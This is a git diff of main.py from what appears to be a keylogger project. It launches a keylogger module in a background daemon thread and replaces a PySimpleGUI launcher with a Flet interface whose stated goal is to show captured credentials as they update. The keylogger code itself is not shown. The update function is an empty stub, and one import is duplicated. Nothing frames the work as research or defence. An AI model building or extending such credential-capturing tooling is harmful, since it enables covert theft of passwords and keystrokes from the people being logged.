@@ -1,12 +1,15 @@
 # main.py
 import threading
-from tkinter.tix import Control
+from setuptools import setup, find_packages, setup
 from setup import setup_log_directory
 from keylogger import start_keylogger, load_credentials, load_config
-from PySimpleGUI import main as gui_main
+from flet import *
 
+"""
+Goal: GUI to see the credentials as they are updated.
+"""
 
-def main():
+def main(page: Page):
     # Step 1: Run the setup to ensure the log directory is configured
     log_directory = setup_log_directory()
 
@@ -19,13 +22,17 @@ def main():
     keylogger_thread = threading.Thread(target=start_keylogger, args=(log_directory, username), daemon=True)
     keylogger_thread.start()
 
-    # Step 4: Launch the GUI
-''' Control(
-        controls=[
-            gui_main(),
-        ]
-    )'''
+    def update_credential_view():
+        # Container containing creds.text = new creds
+        # container containing creds.update()
+        pass
+
+    username_view = Container(
+        Text(value=f"Username: {username}")
+    )
+
+    page.add(username_view)
 
 
 if __name__ == "__main__":
-    main()
+    app(main)
